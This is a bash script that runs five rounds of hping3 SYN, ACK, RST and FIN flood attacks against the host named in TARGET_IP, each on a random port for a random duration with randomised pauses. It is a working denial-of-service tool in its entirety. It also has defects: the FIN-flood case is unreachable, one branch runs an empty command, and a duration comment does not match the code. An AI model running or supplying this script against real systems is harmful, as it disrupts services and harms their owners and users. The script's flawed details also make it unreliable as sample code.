#!/bin/bash

# Ensure TARGET_IP is set
if [ -z "$TARGET_IP" ]; then
    echo "❌ Error: TARGET_IP is not set. Please set the target IP before running the script."
    exit 1
fi


# Function to execute an attack
execute_attack() {
    local TARGET_PORT=$((RANDOM % 65535 + 1))  # Random port (1-65535)
    
    # Randomly select an attack type
    local ATTACK_TYPE=$((RANDOM % 4))  
    local ATTACK_CMD=""


    # Define attack commands with or without payload
    case $ATTACK_TYPE in
        0) ATTACK_CMD="hping3 -S --flood -p $TARGET_PORT $TARGET_IP" ;;  # SYN Flood
        1) ATTACK_CMD="hping3 -A --flood -p $TARGET_PORT $TARGET_IP" ;;  # ACK Flood
        2) ATTACK_CMD="hping3 -R --flood -p $TARGET_PORT $TARGET_IP" ;;  # RST Flood
        4) ATTACK_CMD="hping3 -F --flood -p $TARGET_PORT $TARGET_IP" ;;  # FIN Flood
    esac

    local RANGE_SELECTION=$((RANDOM % 3))

    case $RANGE_SELECTION in
        0) ATTACK_DURATION=$((10 + RANDOM % 41)) ;;  # 10-50 seconds
	1) ATTACK_DURATION=$((50 + RANDOM % 21)) ;;  # 50-70 seconds
	2) ATTACK_DURATION=$((70 + RANDOM % 31)) ;;  # 70-120 seconds
    esac
    echo "🕒 Attack Duration: $ATTACK_DURATION seconds"

    # Start attack in the background
    timeout $ATTACK_DURATION bash -c "$ATTACK_CMD" &

    # Wait for attack duration before stopping
    sleep $ATTACK_DURATION
    
    # Kill the attack
    kill $(jobs -p) 2>/dev/null  

    echo "⏳ Attack interrupted after $ATTACK_DURATION seconds."

    # Random delay before the next attack (6 - 15 seconds)
    local SLEEP_TIME=$((6 + RANDOM % 10))
    echo "⏳ Waiting $SLEEP_TIME seconds before starting the next attack..."
    sleep $SLEEP_TIME
}

# Main attack loop
for i in {1..5}; do
    execute_attack
done

echo "⚡ All attacks completed."

